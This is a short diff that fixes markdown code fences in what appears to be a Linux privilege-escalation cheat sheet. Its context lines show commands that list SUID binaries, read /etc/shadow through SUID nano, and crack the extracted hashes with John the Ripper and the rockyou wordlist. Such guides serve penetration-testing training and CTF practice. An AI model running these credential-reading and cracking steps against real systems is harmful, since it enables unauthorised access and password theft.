@@ -75,12 +75,13 @@ find / -type f -perm -04000 -ls 2>/dev/null
 Use GTFOBins – SUID to check if any of the binaries are exploitable.
 
 Example: nano with SUID
-bash
+```bash
 nano /etc/shadow
+```
 You can now read password hashes.
 
 🧂 Crack Passwords with John the Ripper
-``bash
+```bash
 unshadow passwd.txt shadow.txt > passwords.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
